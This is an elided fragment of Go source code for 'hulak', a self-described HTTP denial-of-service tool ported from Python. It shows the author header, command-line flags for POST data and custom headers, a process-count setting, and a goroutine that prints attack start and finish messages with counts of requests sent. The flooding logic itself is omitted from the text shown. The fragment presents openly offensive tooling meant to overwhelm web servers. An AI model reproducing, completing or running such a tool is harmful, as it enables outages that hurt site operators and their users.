...
/*
 hulak DoS tool on <strike>steroids</strike> goroutines. Just ported from Python with some improvements.
 ...
 Copyright Alexander I.iamrc047 <iamrc047@gmail.com>
*/
...
func main() {
	...
	flag.StringVar(&data, "data", "", "Data to POST. If present hulak will use POST requests instead of GET")
	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
	flag.Parse()

	t := os.Getenv("hulakMAXPROCS")
	...
	go func() {
		fmt.Println("-- hulak Attack Started --\n           Go!\n\n")
		...
		for {
			...
			case targetComplete:
				sent++
				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
				fmt.Println("\r-- hulak Attack Finished --       \n\n\r")
				os.Exit(0)
			}
		}
	}()
